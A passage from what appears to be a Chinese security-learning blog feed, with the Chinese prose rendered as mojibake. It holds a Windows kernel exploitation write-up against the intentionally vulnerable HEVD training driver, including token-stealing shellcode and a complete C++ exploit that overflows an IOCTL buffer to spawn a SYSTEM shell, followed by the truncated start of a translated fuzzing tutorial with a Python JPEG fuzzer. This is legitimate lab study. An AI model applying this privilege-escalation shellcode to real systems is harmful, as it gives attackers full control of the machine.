æ­¤å¦‚æœèƒ½æ‰¾åˆ°ç‰¹æƒè¿›ç¨‹çš„<code>Token</code>ï¼Œå°†å…¶å·è¿‡æ¥ï¼Œç„¶åæ”¾åˆ°å½“å‰è¿›ç¨‹çš„<code>Token</code>ä¸Šï¼Œå°±å¯ä»¥ææƒäº†</p><p>ä¸ºäº†æ‰¾åˆ°<code>EPROCESS</code>å°±éœ€è¦ä¾èµ–å¯¹ä¸‹è¿°ç»“æ„ä½“çš„äº†è§£</p><h4 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h4><p><strong>_KPCR</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kpcr.htm">KPCR</a>ä»£è¡¨<code>Kernel Processor Control Region</code>ï¼Œå†…æ ¸ä¸ºæ¯ä¸€ä¸ªé€»è¾‘å¤„ç†å™¨éƒ½ç»´æŠ¤ä¸€ä¸ª<code>KPCR</code></p><p>å¯ä»¥çœ‹åˆ°<code>_KPRCB</code>ç»“æ„ä½“åœ¨<code>_KPCR</code>çš„åç§»ä¸º<code>0x180</code>çš„åœ°æ–¹</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPCR</span> Prcbntdll!<span class="hljs-variable">_KPCR</span>   +<span class="hljs-number">0</span>x180 Prcb : <span class="hljs-variable">_KPRCB</span></code></pre><p><strong>_KPRCB</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kprcb.htm">_KPRCB</a>ä»£è¡¨<code>Kernel Processor Control Block</code>ï¼Œä¸º<code>KPCR</code>çš„æœ€åä¸€ä¸ªå­—æ®µï¼Œæ‹¥æœ‰å†…æ ¸åœ¨ç®¡ç†å¤„ç†å™¨å’Œç®¡ç†èµ„æºæ—¶éœ€è¦éšæ—¶è®¿é—®çš„å¤§éƒ¨åˆ†å†…å®¹</p><p>å¯ä»¥çœ‹åˆ°åœ¨åç§»ä¸º<code>0x8</code>çš„åœ°æ–¹å¯ä»¥æ‹¿åˆ°å½“å‰çš„çº¿ç¨‹ï¼Œå› æ­¤ç›´æ¥é€šè¿‡ <code>_KPCR+0x188</code> å°±å¯ä»¥è·å–å½“å‰å†…æ ¸çº¿ç¨‹çš„ç»“æ„ä½“</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPRCB</span> CurrentThreadntdll!<span class="hljs-variable">_KPRCB</span>   +<span class="hljs-number">0</span>x008 CurrentThread : Ptr64 <span class="hljs-variable">_KTHREAD</span></code></pre><p><strong>_KTHREAD</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kthread/index.htm">KTHREAD</a>æ˜¯å†…æ ¸å†…éƒ¨çš„çº¿ç¨‹ç»“æ„</p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">KPROCESS</a>ä½äº<code>_KTHREAD.ApcState.Process</code>ä¹‹ä¸­</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KTHREAD</span> ApcStatentdll!<span class="hljs-variable">_KTHREAD</span>   +<span class="hljs-number">0</span>x050 ApcState : <span class="hljs-variable">_KAPC_STATE</span></code></pre><p><strong>_KAPC_STATE</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kprocessor_state.htm">_KAPC_STATE</a>æ˜¯ä¸€ä¸ªè¾ƒä¸ºç®€å•çš„å¤„ç†å™¨çŠ¶æ€é›†åˆ</p><p>å› æ­¤é€šè¿‡<code>_KTHREAD+0x70</code>å¯ä»¥è·å¾—<code>_KPROCESS</code></p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KAPC_STATE</span> Processntdll!<span class="hljs-variable">_KAPC_STATE</span>   +<span class="hljs-number">0</span>x020 Process : Ptr64 <span class="hljs-variable">_KPROCESS</span></code></pre><p><strong>_EPROCESS</strong></p><p>æ ¹æ®<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">_EPROCESS</a>å’Œ<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">_KPROCESS</a>å¯çŸ¥</p><p><code>_EPROCESS</code>çš„ç¬¬ä¸€é¡¹æ˜¯<code>_KPROCESS</code>ï¼Œå› æ­¤æ‰¾åˆ°<code>_KPROCESS</code>çš„åœ°å€ï¼Œå°±ç›¸å½“äºæ‰¾åˆ°äº†<code>_EPROCESS</code>çš„åœ°å€ï¼Œç›¸å½“äº<code>_EPROCESS</code>å°±æ˜¯ä¸€ä¸ªå¤§ç»“æ„ä½“ï¼Œå…¶ä¸­çš„ç¬¬ä¸€åŸŸå°±æ˜¯<code>_KPROCESS</code>ï¼ˆP.S. <code>_KTHREAD</code>å’Œ<code>_ETHREAD</code>ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼‰</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>: kd&gt; dt _EPROCESSntdll!_EPROCESS   +<span class="hljs-number">0x000</span> Pcb              : _KPROCESS   +<span class="hljs-number">0x160</span> ProcessLock      : _EX_PUSH_LOCK   +<span class="hljs-number">0x168</span> CreateTime       : _LARGE_INTEGER   +<span class="hljs-number">0x170</span> ExitTime         : _LARGE_INTEGER   +<span class="hljs-number">0x178</span> RundownProtect   : _EX_RUNDOWN_REF   +<span class="hljs-number">0x180</span> UniqueProcessId  : Ptr64 Void   +<span class="hljs-number">0x188</span> ActiveProcessLinks : _LIST_ENTRY   ...   +<span class="hljs-number">0x208</span> Token            : _EX_FAST_REF   ...</code></pre><p>å› æ­¤éœ€è¦è¦†ç›–çš„<code>Token</code>å°±æ˜¯<code>0x208</code>åç§»çš„åŸŸï¼Œè€Œå¯ä»¥é€šè¿‡éå†<code>ActiveProcessLinks</code>è·å–<code>active</code>çš„è¿›ç¨‹ï¼Œä¸”å·²çŸ¥ç³»ç»Ÿè¿›ç¨‹çš„<code>PID</code>ä¸º<code>4</code>ï¼Œå› æ­¤å°±å¯ä»¥éå†<code>0x188</code>çš„è¿›ç¨‹é“¾ï¼Œæ‰¾åˆ°<code>PID == 4</code>çš„è¿›ç¨‹ï¼Œç„¶åå–å‡ºç³»ç»Ÿè¿›ç¨‹çš„<code>Token</code>ï¼Œè¦†ç›–åˆ°å½“å‰è¿›ç¨‹çš„<code>Token</code>ä¸Š</p><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>å› æ­¤<code>x64</code>çš„<code>shellocde</code>å¦‚ä¸‹</p><pre><code class="hljs assembly">xor rax, rax                        ; Set ZEROmov rax, [gs:rax + 188h]            ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at GS : [0x188]           mov rax, [rax + 70h]                ; Get nt!_KTHREAD.ApcState.Process     mov rcx, rax                        ; Copy current process _EPROCESS structure  mov r11, rcx                        ; Store Token.RefCntand r11, 7mov rdx, 4h                         ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4           SearchSystemPID:mov rax, [rax + 188h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub rax, 188hcmp [rax + 180h], rdx               ; Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPIDmov rdx, [rax + 208h]               ; Get SYSTEM process nt!_EPROCESS.Tokenand rdx, 0fffffffffffffff0hor rdx, r11mov [rcx + 208h], rdx</code></pre><p>å¤‡ä»½ä¸€ä¸‹<code>x86</code>çš„</p><pre><code class="hljs assembly">pushad                              ; Save registers state; Start of Token Stealing Stubxor eax, eax                        ; Set ZEROmov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at FS : [0x124]mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Processmov ecx, eax                        ; Copy current process _EPROCESS structuremov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4SearchSystemPID:mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub eax, 0B8hcmp[eax + 0B4h], edx                ; Get nt!_EPROCESS.UniqueProcessIdjne SearchSystemPIDmov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Tokenmov[ecx + 0F8h], edx                ; Replace target process nt!_EPROCESS.Token                                    ; with SYSTEM process nt!_EPROCESS.Token</code></pre><h3 id="exp-cpp"><a href="#exp-cpp" class="headerlink" title="exp.cpp"></a>exp.cpp</h3><p>æœ€ç»ˆ<code>exp</code>å¦‚ä¸‹ï¼Œè¿™é‡Œçš„<code>shellcode</code>æˆ‘æ˜¯é€šè¿‡<code>nasm</code>è¿›è¡Œç¼–è¯‘çš„ï¼Œç„¶åå†é€šè¿‡<code>hexdump -e &#39;16/1 &quot;%02x&quot; &quot; | &quot;&#39; -e &#39;16/1 &quot;%_p&quot; &quot;\n&quot;&#39; ./1.o</code> å˜æˆå¯è§å­—ç¬¦çš„<code>16</code>è¿›åˆ¶ï¼Œå†è½¬æ¢çš„ï¼ˆæ²¡æ‰¾åˆ°å•¥æ¯”è¾ƒä¼˜é›…çš„æ–¹å¼</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    <span class="hljs-comment">/* nasm -f elf64 ./1.s </span><span class="hljs-comment">    xor rax, rax                    ; Set ZERO</span><span class="hljs-comment">    mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread</span><span class="hljs-comment">                                    ; _KTHREAD is located at GS : [0x188]</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rax, [rax + 70h]            ; Get nt!_KTHREAD.ApcState.Process</span><span class="hljs-comment">    mov rcx, rax                    ; Copy current process _EPROCESS structure</span><span class="hljs-comment">    mov r11, rcx                    ; Store Token.RefCnt</span><span class="hljs-comment">    and r11, 7</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4</span><span class="hljs-comment"></span><span class="hljs-comment">    SearchSystemPID:</span><span class="hljs-comment">        mov rax, [rax + 188h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><span class="hljs-comment">        sub rax, 188h</span><span class="hljs-comment">        cmp [rax + 180h], rdx            ; Get nt!_EPROCESS.UniqueProcessId</span><span class="hljs-comment">        jne SearchSystemPID</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, [rax + 208h]           ; Get SYSTEM process nt!_EPROCESS.Token</span><span class="hljs-comment">    and rdx, 0fffffffffffffff0h</span><span class="hljs-comment">    or rdx, r11</span><span class="hljs-comment">    mov [rcx + 208h], rdx</span><span class="hljs-comment">    */</span>         CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\x48\x83\xc4\x28&quot;</span><span class="hljs-comment">// add rsp, 0x28</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret</span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAlloc failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-comment">//memset(chBuffer + chBufferLen, 0x41, 0x8);</span>    *(INT64*)(chBuffer + chBufferLen) = (INT64)addr;    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ç¼–å†™<code>exp</code>ï¼Œæœ€åéœ€è¦èƒ½è®©<code>ioctl</code>çš„<code>handler</code>ä¸å´©æºƒçš„è¿”å›ï¼Œæ‰å¯ä»¥å†èµ·<code>cmd</code>ï¼Œå¾—åˆ°ä¸€ä¸ªææƒä¹‹åçš„è¿›ç¨‹ï¼Œå› æ­¤è¦æ¢å¤<code>ret</code>åˆ°<code>BufferOverflowStackIoctlHandler</code>ä¹‹åçš„<code>add rsp, 0x28; ret</code>æŒ‡ä»¤</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://bbs.pediy.com/thread-270159.htm">https://bbs.pediy.com/thread-270159.htm</a><br><a href="https://h0mbre.github.io/HEVD_Stackoverflow_64bit/">https://h0mbre.github.io/HEVD_Stackoverflow_64bit/</a><br><a href="https://www.anquanke.com/post/id/245528">https://www.anquanke.com/post/id/245528</a><br><a href="https://50u1w4y.github.io/site/HEVD/homePage/">https://50u1w4y.github.io/site/HEVD/homePage/</a><br><a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">https://www.abatchy.com/2018/01/kernel-exploitation-2</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing Like A Caveman2: Improving Performance è¯‘</title>
    <link href="/2022/06/10/fuzzing%20like%20a%20caveman2:%20improving%20performance/"/>
    <url>/2022/06/10/fuzzing%20like%20a%20caveman2:%20improving%20performance/</url>
    
    <content type="html"><![CDATA[<p>åŸæ–‡ä¸º <a href="https://h0mbre.github.io/Fuzzing-Like-a-Caveman-2">Fuzzing Like A Caveman 2: Improving Performance</a>ï¼Œæœ¬æ–‡ç« ä»…ä¸ºä¸ªäººç†è§£çš„ç¿»è¯‘å’Œå¤‡ä»½</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>åœ¨<code>Fuzzing like a Caveman</code>ä¸€èŠ‚ä¸­ï¼ˆè®²è¿°äº†ç¼–å†™<code>fuzzer</code>ï¼‰ï¼Œæˆ‘ä»¬å°†å…³æ³¨æå‡æˆ‘ä»¬ä¹‹å‰<code>fuzzer</code>çš„æ€§èƒ½ï¼Œè¿™æ„å‘³ç€è¿™å°†ä¸ä¼šæœ‰ä»»ä½•å¤§è§„æ¨¡çš„æ”¹å˜ï¼Œæˆ‘ä»¬ä»…å…³æ³¨æå‡æˆ‘ä»¬ä¹‹å‰é‚£ç¯‡åšå®¢åšçš„ä¸œè¥¿ï¼Œè¿™æ„å‘³ç€åœ¨è¿™ç¯‡åšæ–‡ç»“æŸæ—¶æˆ‘ä»¬æœ€ç»ˆè¿˜æ˜¯ä¼šå¸¦ç€ä¸€ä¸ªéå¸¸åŸºæœ¬çš„<code>fuzzer</code>ï¼ˆä»…è®©å®ƒå˜å¾—æ›´å¿«ï¼ï¼ï¼‰ï¼Œå¸Œæœ›åœ¨ä¸åŒç›®æ ‡ä¸Šèƒ½å‘ç°æ›´å¤šçš„<code>bugs</code>ï¼Œåœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä¸ä¼šçœŸæ­£ä¿®æ”¹å¤šçº¿ç¨‹æˆ–å¤šè¿›ç¨‹ï¼Œæˆ‘ä»¬ä¼šå°†å…¶ä¿å­˜åˆ°åç»­çš„<code>fuzzing</code>æ–‡ç« ä¸­</p><p>æˆ‘è§‰å¾—æˆ‘éœ€è¦åœ¨è¿™é‡ŒåŠ ä¸€ä¸ª<strong>å…è´£å£°æ˜</strong>ï¼Œæˆ‘è¿œä¸æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å¼€å‘è€…ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘åªæ˜¯æ²¡æœ‰è¶³å¤Ÿçš„ç¼–ç¨‹ç»éªŒåƒä¸€ä¸ªæ›´æœ‰ç»éªŒçš„ç¨‹åºå‘˜é‚£æ ·æ¥è¯†åˆ«æé«˜æ€§èƒ½çš„æœºä¼šï¼Œæˆ‘å°†ä½¿ç”¨æˆ‘ç²—ç•¥çš„æŠ€æœ¯å’Œæœ‰é™çš„ç¼–ç¨‹çŸ¥è¯†æ¥æ”¹è¿›æˆ‘ä»¬ä¹‹å‰çš„<code>fuzzer</code>ï¼Œå—¯å°±æ˜¯è¿™æ ·ï¼Œè¿™ä¸ªç”Ÿæˆçš„ä»£ç å°†ä¸æ¼‚äº®ï¼Œä¸å®Œç¾ï¼Œä½†æ˜¯å®ƒä¼šæ¯”æˆ‘ä¸Šä¸€ç¯‡çš„æ–‡ç« åšçš„<code>fuzzer</code>æ›´å¥½ï¼Œè¿™éœ€è¦æåˆ°ï¼Œæ‰€æœ‰çš„æµ‹è¯•éƒ½æ˜¯åœ¨<code>VMWare Workstation</code>ä¸­çš„<code>1 CPU 1 Core</code>çš„<code>x86 Kali</code>è™šæ‹Ÿæœºä¸Š</p><p>è®©æˆ‘ä»¬èŠ±ç‚¹æ—¶é—´åœ¨è¿™ç¯‡åšå®¢ä¸­å®šä¹‰<code>better</code>ï¼Œæˆ‘è¿™é‡Œæ‰€è¯´çš„<code>better</code>æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨næ¬¡<code>fuzzing</code>è¿­ä»£ä¸­ä¼šæ›´å¿«è¿­ä»£ï¼Œå°±æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å°†èŠ±ç‚¹æ—¶é—´å®Œæˆé‡å†™<code>fuzzer</code>ã€ç”¨ä¸€ä¸ªæ›´é…·çš„è¯­è¨€ã€é€‰æ‹©ä¸€ä¸ªæ›´ç¨³å›ºçš„ç›®æ ‡å¹¶åœ¨ä»¥åç”¨æ›´å…ˆè¿›çš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯</p><p><strong>å¾ˆæ˜æ˜¾ï¼Œå¦‚æœä½ è¿˜æ²¡é˜…è¯»ä¸Šä¸€ç¯‡æ–‡ç« ï¼Œä½ å°†ä¼šè·Ÿä¸ä¸Šï¼</strong></p><h2 id="Analyzing-Our-Fuzzer"><a href="#Analyzing-Our-Fuzzer" class="headerlink" title="Analyzing Our Fuzzer"></a>Analyzing Our Fuzzer</h2><p>å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬æœ€åçš„<code>fuzzer</code>æ˜¯èµ·ä½œç”¨çš„ï¼æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶ä¸­å‘ç°äº†ä¸€äº›<code>bugs</code>ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å½“æˆ‘ä»¬å®Œæˆ<code>fuzzer</code>æ—¶ï¼Œæˆ‘ä»¬è¿˜é—æ¼äº†ä¸€äº›ä¼˜åŒ–ï¼Œè®©æˆ‘ä»¬å†çœ‹çœ‹ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„<code>fuzzer</code>ï¼ˆä¸ºäº†æµ‹è¯•åšäº†ä¸€äº›å°çš„æ”¹åŠ¨ï¼‰ã€‚</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> random<span class="hljs-keyword">from</span> pexpect <span class="hljs-keyword">import</span> run<span class="hljs-keyword">from</span> pipes <span class="hljs-keyword">import</span> quote<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> data<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    length = len(data) - <span class="hljs-number">8</span>    index = range(<span class="hljs-number">0</span>, length)    picked_index = random.choice(index)    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )</span>    <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFF</span>            data[picked_index] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7F</span>            data[picked_index] = <span class="hljs-number">127</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00</span>            data[picked_index] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x0000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFFFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00000000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">128</span>:<span class="hljs-comment"># 0x80000000</span>            data[picked_index] = <span class="hljs-number">128</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">64</span>:<span class="hljs-comment"># 0x40000000</span>            data[picked_index] = <span class="hljs-number">64</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            